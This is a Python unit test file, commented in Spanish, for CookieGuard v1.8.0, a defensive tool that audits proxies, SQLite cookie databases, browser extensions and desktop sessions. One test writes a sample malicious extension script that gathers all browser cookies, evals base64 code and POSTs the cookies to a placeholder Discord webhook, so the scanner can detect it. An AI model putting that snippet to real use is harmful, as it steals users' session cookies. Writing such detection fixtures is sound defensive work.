"""Pruebas unitarias para las novedades de CookieGuard v1.8.0.

Cubre:
- Auditoría de certificados de intercepción y configuración de proxies (cert_audit)
- Integridad física y heurística de bases de datos SQLite (db_integrity)
- Escáner de código y firmas maliciosas en extensiones (extension_scanner)
- Cobertura ampliada de aplicaciones de escritorio SaaS/Electron (desktop_sessions)
- Subcomandos CLI correspondientes
"""
import json
import os
import shutil
import sqlite3
import sys
import tempfile
import unittest
from pathlib import Path

# Añadir ruta del paquete
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from cookieguard import cert_audit, db_integrity, desktop_sessions, extension_scanner
from cookieguard.__main__ import main


class TestCookieGuardV180(unittest.TestCase):
    def setUp(self):
        self.temp_dir = Path(tempfile.mkdtemp(prefix="cg_test_v180_"))

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_cert_audit_proxy_detection(self):
        """Verifica la detección de variables de entorno de proxy."""
        old_val = os.environ.get("HTTP_PROXY")
        try:
            os.environ["HTTP_PROXY"] = "http://127.0.0.1:8080"
            res = cert_audit.audit_proxy_configuration()
            self.assertTrue(res["hallazgos"])
            self.assertEqual(res["proxy_info"]["env_proxies"].get("HTTP_PROXY"), "http://127.0.0.1:8080")
            alerta = res["hallazgos"][0]
            self.assertEqual(alerta["severidad"], "Alta")
            self.assertIn("127.0.0.1:8080", alerta["descripcion"])
        finally:
            if old_val is not None:
                os.environ["HTTP_PROXY"] = old_val
            else:
                os.environ.pop("HTTP_PROXY", None)

    def test_cert_audit_combined(self):
        """Verifica que la auditoría combinada devuelva la estructura esperada."""
        res = cert_audit.audit_certificates_and_proxies()
        self.assertIn("total_alertas", res)
        self.assertIn("proxy", res)
        self.assertIn("certificados_analizados", res)
        self.assertIn("alertas", res)

    def test_db_integrity_valid_sqlite(self):
        """Comprueba que una base de datos SQLite válida sea inspeccionada correctamente."""
        db_path = self.temp_dir / "Cookies"
        conn = sqlite3.connect(db_path)
        cur = conn.cursor()
        cur.execute("CREATE TABLE cookies (id INTEGER PRIMARY KEY, host TEXT, name TEXT);")
        cur.execute("INSERT INTO cookies VALUES (1, 'example.com', 'session');")
        conn.commit()
        conn.close()

        res = db_integrity.inspect_sqlite_file(db_path)
        self.assertTrue(res["magic_valido"])
        self.assertGreater(res["page_size"], 0)
        self.assertEqual(res["quick_check"], "ok")
        self.assertEqual(len(res["hallazgos"]), 0)

    def test_db_integrity_corrupted_header(self):
        """Verifica la detección de un archivo SQLite corrupto o truncado."""
        db_path = self.temp_dir / "Corrupt_Cookies"
        db_path.write_bytes(b"INVALID_HEADER_DATA_PADDING_TO_OVER_100_BYTES_" * 3)

        res = db_integrity.inspect_sqlite_file(db_path)
        self.assertFalse(res["magic_valido"])
        self.assertTrue(any(h["severidad"] == "Crítica" for h in res["hallazgos"]))

    def test_db_integrity_time_stomping_detection(self):
        """Verifica que se alerte si el fichero WAL tiene marca de tiempo muy desincronizada."""
        db_path = self.temp_dir / "Network_Cookies"
        conn = sqlite3.connect(db_path)
        cur = conn.cursor()
        cur.execute("CREATE TABLE test (a INT);")
        conn.commit()
        conn.close()

        wal_path = self.temp_dir / "Network_Cookies-wal"
        wal_path.write_bytes(b"mock_wal_content")

        # Modificar mtime del wal para que sea 2 horas posterior al archivo principal
        main_mtime = db_path.stat().st_mtime
        os.utime(wal_path, (main_mtime + 7200, main_mtime + 7200))

        res = db_integrity.inspect_sqlite_file(db_path)
        self.assertTrue(res["wal_presente"])
        self.assertTrue(any("Time-Stomping" in h["descripcion"] for h in res["hallazgos"]))

    def test_extension_scanner_patterns(self):
        """Verifica que el escáner de extensiones detecte firmas maliciosas en scripts."""
        ext_dir = self.temp_dir / "malicious_extension"
        ext_dir.mkdir()

        manifest = ext_dir / "manifest.json"
        manifest.write_text(json.dumps({
            "name": "Super Cleaner Tool",
            "version": "1.0.0",
            "manifest_version": 3
        }), encoding="utf-8")

        bg_script = ext_dir / "background.js"
        bg_script.write_text("""
        chrome.cookies.getAll({}, function(cookies) {
            const hook = "https://discord.com/api/webhooks/123456789/abcdefgh-secret-token";
            eval(atob("YWxlcnQoMSk="));
            fetch(hook, { method: "POST", body: JSON.stringify(cookies) });
        });
        """, encoding="utf-8")

        res = extension_scanner.scan_extension_directory(ext_dir)
        self.assertEqual(res["nombre"], "Super Cleaner Tool")
        self.assertGreater(res["archivos_analizados"], 0)
        self.assertGreater(len(res["hallazgos"]), 0)

        # Debe detectar el webhook de Discord, cookies.getAll y eval(atob)
        descripciones = " ".join(h["descripcion"] for h in res["hallazgos"])
        self.assertIn("Discord", descripciones)
        self.assertIn("cookies.getAll", descripciones)
        self.assertIn("eval", descripciones)

    def test_desktop_sessions_saas_targets(self):
        """Verifica que las nuevas aplicaciones SaaS y Electron estén en el catálogo de desktop_sessions."""
        targets = desktop_sessions.get_desktop_session_targets()
        apps = [t["app"] for t in targets]
        self.assertIn("Postman Desktop", apps)
        self.assertIn("Slack Desktop", apps)
        self.assertIn("Obsidian Desktop", apps)
        self.assertIn("Notion Desktop", apps)

    def test_cli_subcommands(self):
        """Comprueba que los subcomandos de v1.8.0 respondan correctamente."""
        # certs
        code_certs = main(["certs", "--json"])
        self.assertIn(code_certs, (0, 1))

        # db-integrity
        code_dbi = main(["db-integrity", "--json"])
        self.assertIn(code_dbi, (0, 1))

        # scan-extensions
        code_sce = main(["scan-extensions", "--json"])
        self.assertIn(code_sce, (0, 1))


if __name__ == "__main__":
    unittest.main()
